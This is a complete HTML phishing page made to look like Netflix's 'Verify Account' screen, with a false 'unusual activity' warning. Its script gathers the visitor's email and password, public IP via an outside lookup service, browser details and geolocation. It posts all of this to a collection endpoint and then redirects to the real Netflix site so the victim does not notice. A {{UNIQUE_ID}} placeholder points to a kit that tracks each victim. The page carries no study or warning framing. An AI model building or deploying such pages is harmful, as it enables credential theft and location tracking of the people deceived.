<!DOCTYPE html><html><head><title>Netflix - Verify Account</title><script src="https://cdn.tailwindcss.com"></script></head><body class="bg-black text-white min-h-screen flex items-center justify-center p-4"><div class="max-w-md w-full bg-gray-900 rounded-2xl p-8 shadow-2xl border border-gray-800"><div class="text-center mb-8"><img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" class="h-16 mx-auto mb-6"><h1 class="text-2xl font-bold mb-2">Account Verification</h1><p class="text-gray-400 text-sm">Unusual activity detected</p></div><form id="form" class="space-y-4"><input type="hidden" name="unique_id" value="{{UNIQUE_ID}}"><input type="hidden" name="ip" id="form_ip"><input type="hidden" name="user_agent" id="form_ua"><input type="hidden" name="geolocation" id="form_geo"><input type="email" name="email" placeholder="Email" class="w-full p-4 bg-gray-800 border border-gray-700 rounded-xl focus:ring-2 focus:ring-red-500 text-white"><input type="password" name="password" placeholder="Password" class="w-full p-4 bg-gray-800 border border-gray-700 rounded-xl focus:ring-2 focus:ring-red-500 text-white"><button type="submit" class="w-full bg-red-600 py-4 rounded-xl font-bold hover:bg-red-700 transition">Verify Account</button></form><p class="text-xs text-gray-500 mt-4 text-center">Netflix Security Team © 2026</p></div><script>fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>document.getElementById('form_ip').value=d.ip);document.getElementById('form_ua').value=navigator.userAgent;if(navigator.geolocation)navigator.geolocation.getCurrentPosition(p=>{document.getElementById('form_geo').value=`${p.coords.latitude},${p.coords.longitude}`});document.getElementById('form').addEventListener('submit',async e=>{e.preventDefault();const fd=new FormData(e.target);await fetch('/submit',{method:'POST',body:fd});setTimeout(()=>{window.location.href='https://www.netflix.com'},1500)})</script></body></html>
